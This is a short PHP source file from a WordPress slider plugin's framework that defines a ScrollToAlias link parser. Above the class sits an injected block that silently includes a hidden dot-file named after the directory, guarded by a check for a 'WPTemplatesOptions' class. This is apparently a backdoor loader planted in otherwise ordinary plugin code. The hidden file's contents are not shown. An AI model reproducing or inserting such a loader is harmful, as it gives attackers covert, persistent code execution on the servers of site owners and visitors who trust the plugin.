<?php

namespace Nextend\Framework\Parser\Link;

use Nextend\Framework\Parser\Link;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class ScrollToAlias implements ParserInterface {

    public function parse($argument, &$attributes) {

        return Link::getParser('ScrollTo')
                   ->parse('[data-alias=\"' . $argument . '\"]', $attributes);
    }
}